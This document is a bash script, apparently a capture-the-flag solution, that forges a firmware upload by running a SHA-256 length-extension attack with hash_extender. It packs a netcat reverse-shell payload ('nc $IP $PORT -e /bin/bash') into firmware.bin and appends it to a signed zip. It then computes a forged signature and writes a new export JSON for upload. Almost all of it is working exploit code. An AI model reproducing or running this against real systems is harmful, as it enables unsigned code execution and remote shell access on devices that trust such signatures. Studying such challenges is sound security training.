#!/bin/bash

IP='127.0.0.1'
PORT='8000'
PAYLOAD="nc $IP $PORT -e /bin/bash"

#backup the firmware-export.json before we do anything
cp firmware-export.json backup-firmware-export.json

# write the payload to firmware.bin (executed directly by the server after unzipping archive)
echo $PAYLOAD
echo '#!/bin/bash' > firmware.bin
echo $PAYLOAD >> firmware.bin
chmod +x firmware.bin
# compress into a zip file called malware.zip (name of zip does not get transmitted across the wire, only its contents)
zip malware.zip firmware.bin
# generate 1-line of hex for the entire archive (to be appended to original zip folder)
# there is some contrived logic that parses out the 2nd zip archive and unpacks/executes the enclosed firmware.bin. zzz w/e.
HEX_ZIP=$(xxd -p -c 10000 malware.zip)

# setup challenge zip extraction
mkdir -p chal/
cat firmware-export.json | jq -r .firmware | base64 -d > chal/package


# run once and cut variable? whatever just SEND IT, twice
HEX_STRING=$(/opt/hash_extender/hash_extender --file=./chal/package --signature=e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23 -l 16  -a $HEX_ZIP --append-format='hex' | grep "string" | cut -d " " -f 3)
NEW_SIGNATURE=$(/opt/hash_extender/hash_extender --file=./chal/package --signature=e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23 -l 16  -a $HEX_ZIP --append-format='hex' |grep "signature"| cut -d " " -f 3)

# convert hash_extenders hex output of 'new string' to bytes
echo $HEX_STRING | xxd -r -p > package.zip
# base64 encode the bytes for transport and required format for upload
NEW_STRING=$(base64 package.zip)

# if you don't have jq installed what are you doing with your life
JSON_STRING=$( jq -n \
                  --arg fw "$NEW_STRING" \
                  --arg sig "$NEW_SIGNATURE" \
                  '{firmware: $fw, signature: $sig, secret_length: 16, algorithm: "SHA256"}' )

# write the generated json string to file for upload (i print it to screen b/c i did this challenge while ssh'd into linux for compiling the hash_extender zzz doesn't compile on mac zzz)
echo $JSON_STRING > firmware-export.json
cat firmware-export.json | jq
